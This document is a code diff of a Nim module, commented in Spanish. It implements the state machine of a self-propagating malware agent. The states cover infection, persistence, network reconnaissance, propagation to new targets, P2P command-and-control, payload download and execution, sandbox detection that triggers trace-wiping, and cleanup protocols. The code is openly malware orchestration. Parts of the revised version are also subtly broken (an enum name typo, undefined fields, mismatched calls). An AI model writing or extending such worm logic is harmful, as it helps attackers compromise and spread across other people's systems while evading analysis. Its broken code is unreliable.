@@ -1,102 +1,41 @@
-# src/fsm.nim
-# Módulo que implementa la Máquina de Estados Finitos (FSM) para el agente.
-# Incluye manejo de transiciones, timeouts, errores y recuperación.
-
-import times
-import tables
-import sequtils  # Para operaciones con secuencias si es necesario
-# Asumir que hay un módulo de logging personalizado o usar std/logging
-import logging  # Si no está disponible, implementar logInfo, etc.
-
-# Excepciones definidas
-type
-  AgenteError* = object of CatchableError
-
-# Tipos enumerados para estados y eventos
-type
-  EstadoAgente* = enum
-    Inicial, Persistencia, Reconocimiento, Propagacion, ComunicacionP2P, EjecucionPayload, Error
-
-  EventoAgenteKind* = enum
-    InfeccionInicial, SandboxDetectado, PersistenciaExitosa, PersistenciaFallida, ErrorCritico,
-    ObjetivoEncontrado, Timeout, InfeccionExitosa, InfeccionFallida, PropagacionCompleta,
-    ComandoRecibido, ConexionP2PExitosa, ConexionP2PFallida, PayloadFinalizado, PayloadCorrupto
-
-# Estructura del evento (variante implícita mediante campos opcionales)
-type
-  EventoAgente* = object
-    kind*: EventoAgenteKind
-    timestamp*: int64
-    msg*: string
-    codigo*: int
-    contexto*: Table[string, string]
-    error*: string
-    tipoTimeout*: string
-    duracion*: float
-    peerSource*: string
-    comando*: Table[string, string]  # Asumir estructura simple para comando; ajustar si es necesario
-
-# Estructura del agente
-type
-  Agente* = object
-    estado*: EstadoAgente
-    estadoAnterior*: EstadoAgente
-    tiempoEntradaEstado*: int64
-    eventosPendientes*: seq[EventoAgente]
-    # Otros campos: historial de transiciones, métricas, etc. (agregar según sea necesario)
-
-# Configuración de timeouts por estado (en segundos)
-const
-  TimeoutsPorEstado* = {
-    Inicial: 30.0,
-    Persistencia: 120.0,
-    Reconocimiento: 300.0,
-    Propagacion: 600.0,
-    ComunicacionP2P: 1800.0,
-    EjecucionPayload: 900.0,
-    Error: 10.0
-  }.toTable
+import times, tables, deques
+from agent import Agente, actualizarMetricasTiempo, registrarError
+from events import EventoAgente, EventoAgenteKind
+from state_actions import iniciarPersistencia, intentarPersistenciaConTecnica, iniciarReconocimiento, prepararAtaque, solicitarObjetivosP2P, actualizarMetricasPropagacion, continuarReconocimiento, intentarConTecnicaAlternativa, continuarPropagacion, descargarPayload, reconectarP2P, activarModoFallback, solicitarNuevoPayload, iniciarProtocoloLimpieza, reportarResultado, limpiarRecursosPayload, limpiarRastros, terminarEjecucion
+from logger import logEvent, logInfo, logWarning, logCritical, logError
+from recovery import intentarRecuperacion, seleccionarTecnicaAlternativa
+from validation import validarFirmaComando
 
 const
-  MAX_REINTENTOS_P2P* = 3  # Constante de ejemplo para reintentos
+  MAX_REINTENTOS_P2P = 3
+  # Timeouts en segundos por estado
+  TimeoutsPorEstado = {
+    EstadoAgente.Inicial: 30.0,
+    EstadoAgente.Persistencia: 120.0,
+    Estadoagente.Reconocimiento: 300.0,
+    EstadoAgente.Propagacion: 600.0,
+    EstadoAgente.ComunicacionP2P: 1800.0,
+    EstadoAgente.EjecucionPayload: 900.0,
+    EstadoAgente.Error: 10.0
+  }.toTable()
 
-# Funciones auxiliares placeholders (implementar en otros módulos)
-proc logEvent(agente: var Agente, evento: EventoAgente) = discard  # Implementar logging
-proc actualizarMetricasTiempo(agente: var Agente) = discard
-proc iniciarPersistencia(agente: var Agente) = discard
-proc limpiarRastros(agente: var Agente) = discard
-proc registrarError(agente: var Agente, msg: string, codigo: int, contexto: Table[string, string]) = discard
-proc terminarEjecucion(agente: var Agente) = discard
-proc iniciarReconocimiento(agente: var Agente) = discard
-proc seleccionarTecnicaAlternativa(agente: var Agente): string = ""  # Retornar técnica o ""
-proc intentarPersistenciaConTecnica(agente: var Agente, tecnica: string) = discard
-proc prepararAtaque(agente: var Agente, contexto: Table[string, string]) = discard
-proc solicitarObjetivosP2P(agente: var Agente) = discard
-proc actualizarMetricasPropagacion(agente: var Agente, exito: bool) = discard
-proc continuarReconocimiento(agente: var Agente) = discard
-proc intentarConTecnicaAlternativa(agente: var Agente, contexto: Table[string, string]) = discard
-proc continuarPropagacion(agente: var Agente) = discard
-proc validarFirmaComando(agente: var Agente, comando: Table[string, string]): bool = true  # Implementar validación
-proc descargarPayload(agente: var Agente, comando: Table[string, string]) = discard
-proc mantenimientoP2P(agente: var Agente) = discard
-proc reconectarP2P(agente: var Agente, reintentos: int) = discard
-proc activarModoFallback(agente: var Agente) = discard
-proc activarModoPasivo(agente: var Agente) = discard
-proc reportarResultado(agente: var Agente, contexto: Table[string, string]) = discard
-proc limpiarRecursosPayload(agente: var Agente) = discard
-proc solicitarNuevoPayload(agente: var Agente, hash: string) = discard
-proc iniciarProtocoloLimpieza(agente: var Agente) = discard
-proc intentarRecuperacion(agente: var Agente) = discard
+type
+  EstadoMetricas* = object
+    tiempoAcumulado: float
+    conteoTransiciones: int
+    exito: bool
 
 proc manejarEvento*(agente: var Agente, evento: EventoAgente) {.raises: [AgenteError, ValueError].} =
   ## Procesa un evento y transiciona el estado del agente según la lógica de la FSM
-  
   # Validaciones iniciales
-  if agente.tiempoEntradaEstado == 0:  # Asumir que tiempoEntradaEstado == 0 indica no inicializado
+  if agente.isNil:
     raise newException(ValueError, "Agente no inicializado")
   
   if evento.timestamp == 0:
     raise newException(ValueError, "Evento sin timestamp válido")
+  
+  if agente.estado notin TimeoutsPorEstado:
+    raise newException(ValueError, "Estado actual no definido: " & $agente.estado)
   
   # Registrar el evento para análisis
   logEvent(agente, evento)
@@ -107,39 +46,33 @@ proc manejarEvento*(agente: var Agente, evento: EventoAgente) {.raises: [AgenteE
   # Procesar según estado actual y tipo de evento
   case (agente.estado, evento.kind)
   
-  # Estado Inicial
-  of (Inicial, InfeccionInicial):
-    logInfo("Transición: Inicial -> Persistencia (InfeccionInicial)")
+  # ----- ESTADO_INICIAL -----
+  of (EstadoAgente.Inicial, EventoAgenteKind.InfeccionInicial):
     agente.estadoAnterior = agente.estado
-    agente.estado = Persistencia
-    agente.tiempoEntradaEstado = epochTime().toInt64()
-    # Acción de entrada al estado: iniciar establecimiento de persistencia
+    agente.estado = EstadoAgente.Persistencia
+    agente.tiempoEntradaEstado = getTime().toUnix()
+    logInfo("Transición: Inicial → Persistencia (InfeccionInicial)")
     iniciarPersistencia(agente)
-    
-  of (Inicial, SandboxDetectado):
+  
+  of (EstadoAgente.Inicial, EventoAgenteKind.SandboxDetectado):
+    agente.estadoAnterior = agente.estado
+    agente.estado = EstadoAgente.Error
+    agente.tiempoEntradaEstado = getTime().toUnix()
     logCritical("Entorno de análisis detectado, terminando operaciones")
-    agente.estadoAnterior = agente.estado
-    agente.estado = Error
-    agente.tiempoEntradaEstado = epochTime().toInt64()
-    # Acción de limpieza inmediata
     limpiarRastros(agente)
-    # Registrar motivo del error
     registrarError(agente, evento.msg, evento.codigo, evento.contexto)
-    # Terminar ejecución
     terminarEjecucion(agente)
-    
-  # Estado Persistencia
-  of (Persistencia, PersistenciaExitosa):
-    logInfo("Transición: Persistencia -> Reconocimiento (PersistenciaExitosa)")
+  
+  # ----- ESTADO_PERSISTENCIA -----
+  of (EstadoAgente.Persistencia, EventoAgenteKind.PersistenciaExitosa):
     agente.estadoAnterior = agente.estado
-    agente.estado = Reconocimiento
-    agente.tiempoEntradaEstado = epochTime().toInt64()
-    # Acción de entrada: iniciar escaneo de red
+    agente.estado = EstadoAgente.Reconocimiento
+    agente.tiempoEntradaEstado = getTime().toUnix()
+    logInfo("Transición: Persistencia → Reconocimiento (PersistenciaExitosa)")
     iniciarReconocimiento(agente)
-    
-  of (Persistencia, PersistenciaFallida):
+  
+  of (EstadoAgente.Persistencia, EventoAgenteKind.PersistenciaFallida):
     logWarning("Persistencia fallida: " & evento.error)
-    # Intentar técnica alternativa de persistencia
     let tecnicaAlternativa = seleccionarTecnicaAlternativa(agente)
     if tecnicaAlternativa != "":
       logInfo("Intentando técnica alternativa: " & tecnicaAlternativa)
@@ -147,84 +80,66 @@ proc manejarEvento*(agente: var Agente, evento: EventoAgente) {.raises: [AgenteE
     else:
       logError("No hay más técnicas de persistencia disponibles")
       agente.estadoAnterior = agente.estado
-      agente.estado = Error
-      agente.tiempoEntradaEstado = epochTime().toInt64()
+      agente.estado = EstadoAgente.Error
+      agente.tiempoEntradaEstado = getTime().toUnix()
       registrarError(agente, "Persistencia fallida", 500, evento.contexto)
   
-  # Estado Reconocimiento
-  of (Reconocimiento, ObjetivoEncontrado):
-    logInfo("Transición: Reconocimiento -> Propagacion (ObjetivoEncontrado)")
+  # ----- ESTADO_RECONOCIMIENTO -----
+  of (EstadoAgente.Reconocimiento, EventoAgenteKind.ObjetivoEncontrado):
     agente.estadoAnterior = agente.estado
-    agente.estado = Propagacion
-    agente.tiempoEntradaEstado = epochTime().toInt64()
-    # Acción de entrada: preparar ataque para el objetivo encontrado
+    agente.estado = EstadoAgente.Propagacion
+    agente.tiempoEntradaEstado = getTime().toUnix()
+    logInfo("Transición: Reconocimiento → Propagacion (ObjetivoEncontrado)")
     prepararAtaque(agente, evento.contexto)
-    
-  of (Reconocimiento, Timeout):
+  
+  of (EstadoAgente.Reconocimiento, EventoAgenteKind.Timeout):
     if evento.tipoTimeout == "network_scan":
-      logInfo("Transición: Reconocimiento -> ComunicacionP2P (Timeout sin objetivos)")
-      agente.estadoAnterior = agente.estado
-      agente.estado = ComunicacionP2P
-      agente.tiempoEntradaEstado = epochTime().toInt64()
-      # Solicitar más objetivos
+      logInfo("Timeout de escaneo, solicitando objetivos a P2P")
       solicitarObjetivosP2P(agente)
     else:
       logWarning("Timeout desconocido en Reconocimiento: " & evento.tipoTimeout)
   
-  # Estado Propagación
-  of (Propagacion, InfeccionExitosa):
-    logInfo("Transición: Propagacion -> Reconocimiento (InfeccionExitosa)")
+  # ----- ESTADO_PROPAGACION -----
+  of (EstadoAgente.Propagacion, EventoAgenteKind.InfeccionExitosa):
     agente.estadoAnterior = agente.estado
-    agente.estado = Reconocimiento
-    agente.tiempoEntradaEstado = epochTime().toInt64()
-    # Actualizar estadísticas de propagación
+    agente.estado = EstadoAgente.Reconocimiento
+    agente.tiempoEntradaEstado = getTime().toUnix()
+    logInfo("Transición: Propagacion → Reconocimiento (InfeccionExitosa)")
     actualizarMetricasPropagacion(agente, exito = true)
-    # Continuar escaneando
     continuarReconocimiento(agente)
-    
-  of (Propagacion, InfeccionFallida):
+  
+  of (EstadoAgente.Propagacion, EventoAgenteKind.InfeccionFallida):
     logInfo("Propagación fallida para objetivo: " & evento.error)
     actualizarMetricasPropagacion(agente, exito = false)
-    # Intentar con otro objetivo o técnica
     if evento.contexto.hasKey("tecnica_usada"):
       intentarConTecnicaAlternativa(agente, evento.contexto)
     else:
       continuarPropagacion(agente)
   
-  of (Propagacion, PropagacionCompleta):
-    logInfo("Transición: Propagacion -> ComunicacionP2P (PropagacionCompleta)")
+  of (EstadoAgente.Propagacion, EventoAgenteKind.PropagacionCompleta):
+    logInfo("Propagación completa, sin más objetivos")
     agente.estadoAnterior = agente.estado
-    agente.estado = ComunicacionP2P
-    agente.tiempoEntradaEstado = epochTime().toInt64()
-    # Sin más objetivos, pasar a comunicación
+    agente.estado = EstadoAgente.ComunicacionP2P
+    agente.tiempoEntradaEstado = getTime().toUnix()
   
-  # Estado Comunicación P2P
-  of (ComunicacionP2P, ComandoRecibido):
-    logInfo("Comando recibido desde " & evento.peerSource & ": " & evento.comando.getOrDefault("tipo", "desconocido"))
+  # ----- ESTADO_COMUNICACION_P2P -----
+  of (EstadoAgente.ComunicacionP2P, EventoAgenteKind.ComandoRecibido):
     agente.estadoAnterior = agente.estado
-    agente.estado = EjecucionPayload
-    agente.tiempoEntradaEstado = epochTime().toInt64()
-    # Validar firma del comando si es necesario
+    agente.estado = EstadoAgente.EjecucionPayload
+    agente.tiempoEntradaEstado = getTime().toUnix()
+    logInfo("Transición: ComunicacionP2P → EjecucionPayload (ComandoRecibido)")
     if not validarFirmaComando(agente, evento.comando):
       logWarning("Comando con firma inválida, descartando")
-      agente.estado = ComunicacionP2P
+      agente.estado = EstadoAgente.ComunicacionP2P
       return
-    # Descargar y preparar el payload
     descargarPayload(agente, evento.comando)
-    
-  of (ComunicacionP2P, ConexionP2PExitosa):
-    logInfo("Conexión P2P exitosa: mantenimiento")
-    # Acción de mantenimiento
-    mantenimientoP2P(agente)
-    # Resetear timeout para evitar disparo innecesario
-    agente.tiempoEntradaEstado = epochTime().toInt64()
-    
-  of (ComunicacionP2P, ConexionP2PFallida):
+  
+  of (EstadoAgente.ComunicacionP2P, EventoAgenteKind.ConexionP2PFallida):
     logWarning("Conexión P2P fallida: " & evento.error)
     if evento.contexto.hasKey("reintentos"):
-      let reintentos = evento.contexto["reintentos"].getInt(0)
+      let reintentos = evento.contexto["reintentos"].getInt()
       if reintentos < MAX_REINTENTOS_P2P:
-        logInfo("Reintentando conexión P2P (intento " & $(reintentos + 1) & ")")
+        logInfo("Reintentando conexión P2P (intento " & $reintentos & ")")
         reconectarP2P(agente, reintentos + 1)
       else:
         logWarning("Máximo de reintentos P2P alcanzado, usando fallback")
@@ -232,82 +147,116 @@ proc manejarEvento*(agente: var Agente, evento: EventoAgente) {.raises: [AgenteE
     else:
       reconectarP2P(agente, 1)
   
-  of (ComunicacionP2P, Timeout):
-    if evento.tipoTimeout == "p2p":
-      logInfo("Transición: ComunicacionP2P -> Reconocimiento (Timeout sin actividad)")
-      agente.estadoAnterior = agente.estado
-      agente.estado = Reconocimiento
-      agente.tiempoEntradaEstado = epochTime().toInt64()
-      # Modo pasivo
-      activarModoPasivo(agente)
-    else:
-      logWarning("Timeout desconocido en ComunicacionP2P: " & evento.tipoTimeout)
-  
-  # Estado Ejecución de Payload
-  of (EjecucionPayload, PayloadFinalizado):
-    logInfo("Payload finalizado, regresando a ComunicacionP2P")
+  of (EstadoAgente.ComunicacionP2P, EventoAgenteKind.Timeout):
+    logInfo("Timeout sin actividad en ComunicacionP2P, cambiando a modo pasivo")
     agente.estadoAnterior = agente.estado
-    agente.estado = ComunicacionP2P
-    agente.tiempoEntradaEstado = epochTime().toInt64()
-    # Reportar resultado del payload
+    agente.estado = EstadoAgente.Reconocimiento
+    agente.tiempoEntradaEstado = getTime().toUnix()
+  
+  # ----- ESTADO_EJECUCION_PAYLOAD -----
+  of (EstadoAgente.EjecucionPayload, EventoAgenteKind.PayloadFinalizado):
+    agente.estadoAnterior = agente.estado
+    agente.estado = EstadoAgente.ComunicacionP2P
+    agente.tiempoEntradaEstado = getTime().toUnix()
+    logInfo("Transición: EjecucionPayload → ComunicacionP2P (PayloadFinalizado)")
     reportarResultado(agente, evento.contexto)
-    # Limpiar recursos del payload
     limpiarRecursosPayload(agente)
-    
-  of (EjecucionPayload, PayloadCorrupto):
-    logError("Payload corrupto: " & evento.error)
-    agente.estadoAnterior = agente.estado
-    agente.estado = ComunicacionP2P
-    agente.tiempoEntradaEstado = epochTime().toInt64()
-    # Solicitar nuevo payload
-    solicitarNuevoPayload(agente, evento.contexto.getOrDefault("hash_original", ""))
   
-  # Manejo de errores críticos en cualquier estado
-  of (_, ErrorCritico):
+  of (EstadoAgente.EjecucionPayload, EventoAgenteKind.PayloadCorrupto):
+    agente.estadoAnterior = agente.estado
+    agente.estado = EstadoAgente.ComunicacionP2P
+    agente.tiempoEntradaEstado = getTime().toUnix()
+    logError("Payload corrupto: " & evento.error)
+    solicitarNuevoPayload(agente, evento.contexto["hash_original"].getStr())
+  
+  # ----- MANEJO DE ERRORES CRÍTICOS (en cualquier estado) -----
+  of (_, EventoAgenteKind.ErrorCritico):
     logCritical("Error crítico: " & evento.msg & " (código: " & $evento.codigo & ")")
     agente.estadoAnterior = agente.estado
-    agente.estado = Error
-    agente.tiempoEntradaEstado = epochTime().toInt64()
+    agente.estado = EstadoAgente.Error
+    agente.tiempoEntradaEstado = getTime().toUnix()
     registrarError(agente, evento.msg, evento.codigo, evento.contexto)
-    # Iniciar protocolo de limpieza
     iniciarProtocoloLimpieza(agente)
   
-  # Transiciones no válidas
+  # ----- TRANSICIONES NO VÁLIDAS -----
   else:
     logWarning("Transición no válida desde " & $agente.estado & " con evento " & $evento.kind)
-    # Almacenar evento para análisis posterior
-    agente.eventosPendientes.add(evento)
-    # Intentar recuperación según estado actual
+    agente.eventosPendientes.addLast(evento)
     intentarRecuperacion(agente)
 
 proc verificarTimeout*(agente: var Agente) =
   ## Verifica si el tiempo en el estado actual ha excedido el timeout permitido
-  let tiempoActual = epochTime()
-  let tiempoEnEstado = tiempoActual - float(agente.tiempoEntradaEstado)
+  let tiempoActual = getTime().toUnix()
+  let tiempoEnEstado = tiempoActual - agente.tiempoEntradaEstado
+  let timeoutMaximo = TimeoutsPorEstado[agente.estado]
   
-  if tiempoEnEstado > TimeoutsPorEstado[agente.estado]:
+  if tiempoEnEstado > timeoutMaximo.int64:
     logWarning("Timeout en estado " & $agente.estado & 
               " (tiempo: " & $tiempoEnEstado & "s)")
-    # Disparar evento de timeout específico para el estado
-    var tipoTimeout = "generic"
+    
+    var eventoTimeout: EventoAgente
     case agente.estado
-    of Reconocimiento:
-      tipoTimeout = "network_scan"
-    of Propagacion:
-      tipoTimeout = "propagation"
-    of ComunicacionP2P:
-      tipoTimeout = "p2p"
-    of EjecucionPayload:
-      tipoTimeout = "payload"
-    of Persistencia:
-      tipoTimeout = "persistence"
-    of Inicial:
-      tipoTimeout = "initial"
-    of Error:
-      tipoTimeout = "error"
-    agente.manejarEvento(EventoAgente(
-      kind: Timeout,
-      tipoTimeout: tipoTimeout,
-      duracion: tiempoEnEstado,
-      timestamp: int64(tiempoActual * 1000)  # Ajustar si epochTime es en segundos
-    ))
+    of EstadoAgente.Reconocimiento:
+      eventoTimeout = EventoAgente(
+        kind: EventoAgenteKind.Timeout,
+        tipoTimeout: "network_scan",
+        duracion: tiempoEnEstado.float,
+        timestamp: tiempoActual
+      )
+    of EstadoAgente.Propagacion:
+      eventoTimeout = EventoAgente(
+        kind: EventoAgenteKind.Timeout,
+        tipoTimeout: "propagation",
+        duracion: tiempoEnEstado.float,
+        timestamp: tiempoActual
+      )
+    of EstadoAgente.ComunicacionP2P:
+      eventoTimeout = EventoAgente(
+        kind: EventoAgenteKind.Timeout,
+        tipoTimeout: "p2p",
+        duracion: tiempoEnEstado.float,
+        timestamp: tiempoActual
+      )
+    else:
+      eventoTimeout = EventoAgente(
+        kind: EventoAgenteKind.Timeout,
+        tipoTimeout: "generic",
+        duracion: tiempoEnEstado.float,
+        timestamp: tiempoActual
+      )
+    
+    manejarEvento(agente, eventoTimeout)
+
+proc gestionarEventosPendientes*(agente: var Agente) =
+  ## Procesa eventos pendientes según prioridad
+  var eventosCriticos: Deque[EventoAgente]
+  var eventosComandos: Deque[EventoAgente]
+  var eventosNormales: Deque[EventoAgente]
+  
+  # Clasificar eventos por prioridad
+  for evento in agente.eventosPendientes:
+    case evento.prioridad
+    of PrioridadEvento.Critico: eventosCriticos.addLast(evento)
+    of PrioridadEvento.Comando: eventosComandos.addLast(evento)
+    of PrioridadEvento.Normal: eventosNormales.addLast(evento)
+  
+  # Procesar en orden de prioridad
+  while eventosCriticos.len > 0 or eventosComandos.len > 0 or eventosNormales.len > 0:
+    if eventosCriticos.len > 0:
+      let evento = eventosCriticos.popFirst()
+      manejarEvento(agente, evento)
+    elif eventosComandos.len > 0:
+      let evento = eventosComandos.popFirst()
+      manejarEvento(agente, evento)
+    else:
+      let evento = eventosNormales.popFirst()
+      manejarEvento(agente, evento)
+  
+  agente.eventosPendientes.clear()
+
+proc iniciarFSM*(agente: var Agente) =
+  ## Inicializa la máquina de estados finitas
+  agente.estado = EstadoAgente.Inicial
+  agente.tiempoEntradaEstado = getTime().toUnix()
+  agente.eventosPendientes = initDeque[EventoAgente]()
+  logInfo("FSM inicializada en estado Inicial")
